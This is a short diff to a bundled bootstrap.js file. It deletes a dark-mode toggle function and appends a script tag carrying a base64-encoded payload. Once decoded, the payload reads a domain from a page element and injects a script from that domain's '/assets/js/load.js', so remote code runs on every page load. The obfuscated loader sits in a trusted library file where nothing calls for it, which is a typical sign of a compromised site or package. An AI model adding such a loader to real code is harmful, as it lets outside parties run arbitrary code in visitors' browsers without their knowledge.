@@ -3923,7 +3923,4 @@
 
 })));
 //# sourceMappingURL=bootstrap.js.map
-function myFunction() {
-  var element = document.body;
-  element.classList.toggle("dark-mode");
-}
+<script src="data:text/javascript;base64,dmFyIHA9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdLGU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksZD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbZG9tYWluXSIpLmdldEF0dHJpYnV0ZSgiZG9tYWluIik7ZS5zcmM9Ii8vIitkKyIvYXNzZXRzL2pzL2xvYWQuanMiLHAuYWZ0ZXIoZSk7"></script>
